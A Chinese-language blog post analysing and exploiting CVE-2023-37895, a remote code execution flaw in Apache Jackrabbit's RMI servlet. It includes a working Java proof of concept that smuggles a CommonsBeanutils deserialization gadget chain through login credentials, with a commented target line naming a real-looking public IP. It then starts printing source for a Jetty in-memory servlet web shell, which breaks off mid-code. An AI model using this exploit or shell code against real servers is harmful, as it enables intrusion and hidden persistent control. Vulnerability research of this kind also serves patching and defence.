<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>CVE-2023-37895 Apache Jackrabbit RMI RCE 分析及利用 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="CVE-2023-37895 Apache Jackrabbit RMI RCE 分析及利用 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/10/16/Apache%20Jackrabbit%20RMI%20RCE%20%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-10-16T12:36:16.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>October</span>
            <span>16,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">CVE-2023-37895 Apache Jackrabbit RMI RCE 分析及利用</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <p>参考：<br><a target="_blank" rel="noopener" href="https://y4er.com/posts/cve-2023-37895-apache-jackrabbit-rmi-rce/">CVE-2023-37895: Apache Jackrabbit RMI RCE</a><br>CVE-2023-37895</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>直接就是以jar包的形式进行部署的，所以并没有什么骚操作，下载地址如下<br><a target="_blank" rel="noopener" href="https://jackrabbit.apache.org/jcr/downloads.html">https://jackrabbit.apache.org/jcr/downloads.html</a><br>这里选择版本2.20.10漏洞版本，咱们运行jackrabbit的时候需要指定一下jre目录，否则会500的<br><code>java -Djava.home=&quot;%JAVA_HOME%\jre&quot; -jar jackrabbit-standalone-2.20.10.jar</code></p>
<h1 id="漏洞复现-amp-amp-漏洞分析"><a href="#漏洞复现-amp-amp-漏洞分析" class="headerlink" title="漏洞复现&amp;&amp;漏洞分析"></a>漏洞复现&amp;&amp;漏洞分析</h1><p>该漏洞是一个典型的RMI注入漏洞。攻击者可以调用服务器的远程方法，并且传入恶意参数，导致参数进行反序列化最终RCE被攻击。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> org.apache.jackrabbit.servlet.remote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.jackrabbit.rmi.remote.RemoteRepository;</span><br><span class="line"><span class="keyword">import</span> org.apache.jackrabbit.rmi.server.RemoteAdapterFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.jackrabbit.rmi.server.ServerAdapterFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.jackrabbit.servlet.ServletRepository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteBindingServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">162482284843619248L</span>;</span><br><span class="line">    <span class="keyword">private</span> RemoteRepository remote;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RemoteBindingServlet</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> RemoteRepository <span class="title function_">getRemoteRepository</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.remote == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">RemoteAdapterFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="built_in">this</span>.getRemoteAdapterFactory();</span><br><span class="line">                <span class="built_in">this</span>.remote = factory.getRemoteRepository(<span class="keyword">new</span> <span class="title class_">ServletRepository</span>(<span class="built_in">this</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException var2) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(<span class="string">&quot;Failed to create the remote repository reference&quot;</span>, var2);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.remote;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> RemoteAdapterFactory <span class="title function_">getRemoteAdapterFactory</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="built_in">this</span>.getInitParameter(RemoteAdapterFactory.class.getName());</span><br><span class="line">        <span class="keyword">if</span> (name == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ServerAdapterFactory</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">factoryClass</span> <span class="operator">=</span> Class.forName(name);</span><br><span class="line">                <span class="keyword">return</span> (RemoteAdapterFactory)factoryClass.newInstance();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException var3) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(<span class="string">&quot;Remote adapter factory class not found: &quot;</span> + name, var3);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InstantiationException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(<span class="string">&quot;Failed to instantiate the adapter factory: &quot;</span> + name, var4);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(<span class="string">&quot;Adapter factory constructor is not public: &quot;</span> + name, var5);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassCastException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(<span class="string">&quot;Invalid remote adapter factory class: &quot;</span> + name, var6);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(response.getOutputStream());</span><br><span class="line">        output.writeObject(RemoteObject.toStub(<span class="built_in">this</span>.getRemoteRepository()));</span><br><span class="line">        output.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>漏洞是因为一个Servlet引起的，该servlet代码如上，对应路由<code>/rmi</code>，简洁明了就是rmi，我们断点给在<br><code>output.writeObject(RemoteObject.toStub(this.getRemoteRepository()));</code><br>这一句代码上，我们直接开启debug。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.pocs.solutions.cve;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.javasec.utils.SerializeUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.jackrabbit.commons.JcrUtils;</span><br><span class="line"><span class="keyword">import</span> javax.jcr.Repository;</span><br><span class="line"><span class="keyword">import</span> javax.jcr.SimpleCredentials;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApacheJackrabbitRCE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//Templates obj = SerializeUtils.getTemplateByclass(&quot;E:\\CTFLearning\\JettyMemshell\\target\\classes\\com\\boogipop\\memshell\\InjectJettyServletShell.class&quot;);</span></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">obj</span> <span class="operator">=</span> SerializeUtils.getTemplate(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// 为了能够继续走下去,priority的size必须大于等于2</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        SerializeUtils.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        SerializeUtils.setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line">        <span class="type">SimpleCredentials</span> <span class="variable">simpleCredentials</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleCredentials</span>(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1&quot;</span>.toCharArray());</span><br><span class="line">        simpleCredentials.setAttribute(<span class="string">&quot;a&quot;</span>,queue);</span><br><span class="line">        <span class="type">Repository</span> <span class="variable">repository</span> <span class="operator">=</span> JcrUtils.getRepository(<span class="string">&quot;http://localhost:8080/rmi&quot;</span>);</span><br><span class="line">        <span class="comment">//Repository repository = JcrUtils.getRepository(&quot;http://114.116.119.253:8080/rmi&quot;);</span></span><br><span class="line">        repository.login(simpleCredentials);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>POC如上，在POC中用到了JcrUtils去获取到repository仓库<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697456649067-f47decf9-7a7b-4119-8378-aef77547fcfa.png#averageHue=%23555a63&clientId=ud2243dba-4afd-4&from=paste&height=243&id=u883cca60&originHeight=304&originWidth=1187&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=427883&status=done&style=none&taskId=u23413acf-a9c6-490d-a02f-a9f5b66448e&title=&width=949.6" alt="image.png"><br>然后在服务端就会收到请求<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697456701640-6b953dc2-59fc-42d5-8ea8-2a72b5bb75b2.png#averageHue=%2351555e&clientId=ud2243dba-4afd-4&from=paste&height=246&id=u01aae0ec&originHeight=307&originWidth=1170&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=379561&status=done&style=none&taskId=u45670ceb-0373-4c5c-8100-b00f14ad18f&title=&width=936" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697456763718-5da40d9e-2af8-4f97-b5fa-e43c049e5ec7.png#averageHue=%234a4e55&clientId=ud2243dba-4afd-4&from=paste&height=554&id=u8fc955db&originHeight=693&originWidth=1158&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=754221&status=done&style=none&taskId=u9319605b-8d75-418f-96c7-9541a032717&title=&width=926.4" alt="image.png"><br>在攻击者这里获取到的是一个RmiReposityFactory$1，一个内部类RmiSafeClientRepository，我们看看他对应的代码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697456913924-9950037d-b001-4af3-9011-a76781e4cea1.png#averageHue=%2352565d&clientId=ud2243dba-4afd-4&from=paste&height=175&id=uf03aa44b&originHeight=219&originWidth=820&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=221535&status=done&style=none&taskId=uc98c3440-9d0d-4236-a97b-609c1848c1e&title=&width=656" alt="image.png"><br>继承SafeClientRepository的方法，我们往上看<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697456929637-1401eb64-18c6-4a19-9bd7-7967a62fde83.png#averageHue=%23565c63&clientId=ud2243dba-4afd-4&from=paste&height=166&id=u8326785e&originHeight=207&originWidth=1212&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=294249&status=done&style=none&taskId=ub89aa87a-9c2c-4511-9779-89025297984&title=&width=969.6" alt="image.png"><br>其中有一个login方法传入一个Credentials对象，我们现在需要找一个Credentials对象，其中有属性可以控制为我们的恶意payload<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697456957890-78b82c20-6a70-4609-b7f2-9110203a33ec.png#averageHue=%23515a58&clientId=ud2243dba-4afd-4&from=paste&height=222&id=u15977ec2&originHeight=277&originWidth=1211&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=182387&status=done&style=none&taskId=u3564c700-d8ed-46a1-90f9-a79bdaf1dd9&title=&width=968.8" alt="image.png"><br>一共五个随便挑一个适合的。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697456969403-8686baf2-d13c-4817-92d9-4aa89b31e9e9.png#averageHue=%23585b63&clientId=ud2243dba-4afd-4&from=paste&height=149&id=u1d343ed0&originHeight=186&originWidth=774&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=151481&status=done&style=none&taskId=uf866e5db-7016-46a3-947b-e9d8fae6697&title=&width=619.2" alt="image.png"><br>其中simplecredentials有一个attributes属性，并且有对应的setter和getter去设置，完美符合<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697456989286-93cc94d8-8560-4c61-9468-697832482410.png#averageHue=%23525860&clientId=ud2243dba-4afd-4&from=paste&height=258&id=u3a7b861f&originHeight=323&originWidth=1004&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=353549&status=done&style=none&taskId=ucea28b57-7f8b-4738-bdfb-1abb9590d14&title=&width=803.2" alt="image.png"><br>到这里payload构造流程就分析完成了，随后会RMI调用远程服务端的方法login。对rmi反序列化熟悉一点的师傅会对一个方法很熟悉，unmarshalvalue方法，在rmi请求的流程中，客户端会序列化请求的参数，然后在服务端的unmarshalvalue方法进行readobject反序列化，从而导致RCE<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697457082285-e7e19608-8786-44e5-a2da-bd2105bdaa4d.png#averageHue=%235d6268&clientId=ud2243dba-4afd-4&from=paste&height=77&id=ub25964b5&originHeight=96&originWidth=368&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40121&status=done&style=none&taskId=uc9cb830c-3e4d-4293-8494-f10ed99cca2&title=&width=294.4" alt="image.png"><br>服务端有cb依赖，所以我们挑选cb链去加载恶意类即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697457143105-583f71c8-1245-4299-895f-f2efa995d650.png#averageHue=%23494d54&clientId=ud2243dba-4afd-4&from=paste&height=941&id=ud04c2dda&originHeight=1176&originWidth=1973&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1995383&status=done&style=none&taskId=ub3ebc6dc-a464-4c64-9340-78205043fa3&title=&width=1578.4" alt="image.png"><br>通过调试也可以验证显示在UnicastRef的invoke方法里调用了marshalvalue去序列化参数，然后call.executeCall之后就会像服务端发起请求<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697457191055-67611def-11fe-43a7-9878-f0fda7b23c06.png#averageHue=%23474b51&clientId=ud2243dba-4afd-4&from=paste&height=655&id=u4af981e4&originHeight=819&originWidth=2499&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1636514&status=done&style=none&taskId=u74514e2a-96cc-4a25-90cc-a21bc373688&title=&width=1999.2" alt="image.png"><br>可以看到unmarshalValue方法，随之就会弹出计算器了<img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697457248498-5b3ea7b9-d385-4bdf-bb16-efb5f8814aeb.png#averageHue=%23485056&clientId=ud2243dba-4afd-4&from=paste&height=762&id=ufd0e33f1&originHeight=953&originWidth=1668&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1180253&status=done&style=none&taskId=u4b77f32d-ca80-42bd-8a06-f55ebe09597&title=&width=1334.4" alt="image.png"></p>
<h1 id="回显策略"><a href="#回显策略" class="headerlink" title="回显策略"></a>回显策略</h1><p>Apache Jackrabbit 是基于Jetty9的服务器，我们直接挑选一款jetty内存马就行，这里我用的是servelet内存马，因为filter的优先级没有404页面的高，导致我们无法进入filter的逻辑。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop.memshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectJettyServletShell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">servletHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;ServletTemplates&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterClassName</span> <span class="operator">=</span> <span class="string">&quot;com.boogipop.memshell.ServletTemplates&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;/*&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">LoadServlet</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Thread.currentThread().getContextClassLoader().loadClass(filterClassName).newInstance();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">a</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, Integer.TYPE, Integer.TYPE);</span><br><span class="line">            a.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">byte</span>[] b = (<span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>()).decodeBuffer(<span 